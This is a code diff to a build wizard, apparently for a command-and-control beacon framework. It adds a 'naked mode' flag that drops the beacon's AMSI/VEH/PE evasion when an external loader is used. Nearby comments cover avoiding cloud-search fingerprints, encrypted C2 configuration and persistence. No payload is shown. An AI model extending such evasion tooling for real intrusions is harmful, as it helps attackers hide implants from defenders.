@@ -139,6 +139,7 @@ class BaseConfig:
     prekey_pubs_hex:     str = ""   # hex-encoded concatenated X25519 public keys (prekey pool)
     fs_enabled:          bool = True  # forward secrecy enabled (v2 protocol)
     debug_mode:          bool = False
+    naked_mode:          bool = False
 
     # Per-deploy cloud filenames — set from pub_key hash in run() to avoid
     # static Stratum fingerprints (.s2l/.s2w/.sk) discoverable via cloud search.
@@ -512,6 +513,11 @@ class ProviderWizard(ABC):
         _p([("class:info",   "    WARNING: debug=yes embeds print statements — avoid in operational builds")])
         cfg.debug_mode = ask_yn("Enable debug output (operational: no)", cfg.debug_mode)
 
+        _p([("", "")])
+        _p([("class:yellow", "  Naked Mode:")])
+        _p([("class:info",   "    Strip all beacon evasion (AMSI/VEH/PE resources). Use when wrapping with an external loader.")])
+        cfg.naked_mode = ask_yn("Naked beacon (external loader handles evasion)", cfg.naked_mode)
+
         self._step_configure_extra(cfg)
         self._show_config(cfg)
         self._print_mode_diagram(cfg)
@@ -535,6 +541,8 @@ class ProviderWizard(ABC):
         _row("Mode",      cfg.mode, "class:bold")
         _row("Debug",     "ENABLED" if cfg.debug_mode else "off",
              "class:red" if cfg.debug_mode else "class:dim")
+        _row("Naked",     "ENABLED" if cfg.naked_mode else "off",
+             "class:red" if cfg.naked_mode else "class:dim")
         _row("Provider",  self.PROVIDER_NAME)
         if cfg.session_label:
             _row("Label",     cfg.session_label)
@@ -876,6 +884,7 @@ class ProviderWizard(ABC):
                     "STRATUM_BLOB_PATH_LINUX": cfg.blob_path_linux,
                     "STRATUM_BLOB_PATH_WIN":   cfg.blob_path_win,
                     "STRATUM_DEBUG":           "true" if cfg.debug_mode else "false",
+                    "STRATUM_NAKED":           "true" if cfg.naked_mode else "false",
                     "CC_x86_64_unknown_linux_musl": "musl-gcc",
                     **self._native_agent_extra_env(cfg),  # APP_KEY/SECRET/REFRESH_TOKEN
                     # Per-deployment persist identity (CRIT-1 Linux, CRIT-2 Windows)
@@ -924,6 +933,7 @@ class ProviderWizard(ABC):
                         "STRATUM_SESSION_KEY":    cfg.session_key,
                         "STRATUM_PREKEY_POOL_B64": base64.b64encode(bytes.fromhex(cfg.prekey_pubs_hex)).decode(),
                         "STRATUM_DEBUG":          "true" if cfg.debug_mode else "false",
+                        "STRATUM_NAKED":          "true" if cfg.naked_mode else "false",
                     }
                 elif cfg.mode == "stageless-enc":
                     # Full agent; C2 config encrypted with stub_secret baked in stub.
